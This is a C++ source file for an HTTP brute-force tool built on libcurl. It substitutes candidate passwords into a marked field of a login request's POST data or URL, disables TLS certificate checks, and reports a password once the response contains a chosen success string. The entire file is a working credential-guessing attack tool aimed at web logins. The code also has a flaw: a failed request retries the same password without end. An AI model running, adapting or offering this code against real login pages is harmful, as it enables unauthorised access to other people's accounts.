#include "http_bruteforce.h"
#include <curl/curl.h>

#include <cstring>

http_bruteforce::http_bruteforce(char *info[]) {
    this->link = info[0];
    this->post_data = info[1];
    this->valid_string = info[2];
    this->user_agent = info[3];
    this->follow_redirections = info[4][0];
}

http_bruteforce::~http_bruteforce() {
}

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

std::string http_bruteforce::bruteforce() {
    CURL *curl;
    CURLcode res;

    std::string readBuffer;

    curl = curl_easy_init();
    if(curl) {
        size_t index = post_data.find("BRUTEFORCE"); //it's the same index the whole time
        while (true) {
            std::string new_link = link;

            if (post_data != "(null)") {
                std::string new_post_data = post_data;
                new_post_data.replace(index, 10, passwords[0]);
                curl_easy_setopt(curl, CURLOPT_COPYPOSTFIELDS, new_post_data.c_str());
            } else {
                size_t index = new_link.find("BRUTEFORCE");
                new_link.replace(index, 10, passwords[0]);
            }

            curl_easy_setopt(curl, CURLOPT_URL, new_link.c_str());
            curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent.c_str());

            if (follow_redirections == '1')
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); //follow redirections
            else
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);

            //ssl crap
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); //skip peer verification
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); //skip host verification

            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

            res = curl_easy_perform(curl);
            if(res != CURLE_OK)
                continue;

            if (readBuffer.find(valid_string) != std::string::npos) {
                std::cout << "Found it" << std::endl;
                curl_easy_cleanup(curl);
                curl_global_cleanup();
                return passwords[0];
            } else
                readBuffer = "";

            passwords.erase(passwords.begin(), passwords.begin() + 1); //remove the last used password

            if (passwords.size() == 0)
                break;
        }
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return "";
}
